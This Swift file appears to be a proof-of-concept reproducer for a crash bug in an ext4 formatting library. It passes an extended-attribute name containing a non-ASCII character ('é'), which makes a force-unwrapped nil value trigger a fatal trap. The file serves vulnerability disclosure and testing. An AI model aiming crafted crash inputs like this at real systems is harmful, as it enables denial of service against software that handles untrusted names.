// ============================================================
// PoCXattrCrash — CWE-476 deterministic PoC
// apple/containerization — ContainerizationEXT4
// Vulnerable: Sources/ContainerizationEXT4/EXT4+Xattrs.swift:60
//   char.asciiValue! → nil → FATAL TRAP when name contains non-ASCII char
//
// Build: swift build --target PoCXattrCrash  (swift-tools-version: 6.2)
// ============================================================

import Foundation
import SystemPackage
import ContainerizationEXT4

// Verify the nil-producing character
let badChar: Character = "\u{00E9}"  // é
print("[*] char.asciiValue for 'é' = \(String(describing: badChar.asciiValue)) (nil → will trap)")

// Non-ASCII xattr name: "user.café"
// 'é' triggers char.asciiValue! → nil → FATAL TRAP in EXT4+Xattrs.swift:60
let xattrName  = "user.caf\u{00E9}"
// 92-byte value → attribute.size = 12+92 = 104 > ~68 bytes inline → block path
let xattrValue = Data(repeating: 0x41, count: 92)

print("[*] xattr name: \(xattrName.debugDescription)  value: \(xattrValue.count) bytes")
print("[*] Trigger condition: attribute.size (104) > inodeFreeBytes (~68) → block storage path")
print("[*] Call path: create() → UInt32(attribute.hash) → hash getter → char.asciiValue! on 'é'")

// Temp file for ext4 image
let imgPath = FilePath("/tmp/poc_xattr_crash_\(Int.random(in: 10000...99999)).ext4")
print("[*] EXT4.Formatter(fp) at: \(imgPath)")

let formatter: EXT4.Formatter
do {
    formatter = try EXT4.Formatter(imgPath)
} catch {
    print("[-] Formatter init failed: \(error)")
    exit(1)
}

print("[*] Calling EXT4.Formatter.create(path:mode:xattrs:) ...")
print("[*] CRASH IMMINENT — computeHash will unwrap nil on 'é' ...")
fflush(stdout)

// THE CRASH: EXT4+Xattrs.swift line 60
// hash = (hash << 5) ^ (hash >> 27) ^ UInt32(char.asciiValue!)
//                                                ^^^^^^^^^^^^ nil for 'é' → FATAL TRAP
do {
    try formatter.create(
        path: FilePath("/trigger.txt"),
        mode: 0o100644,
        xattrs: [xattrName: xattrValue]
    )
    print("[-] UNEXPECTED: returned without crash")
    exit(1)
} catch {
    print("[-] Caught error (crash should have fired first): \(error)")
    exit(1)
}
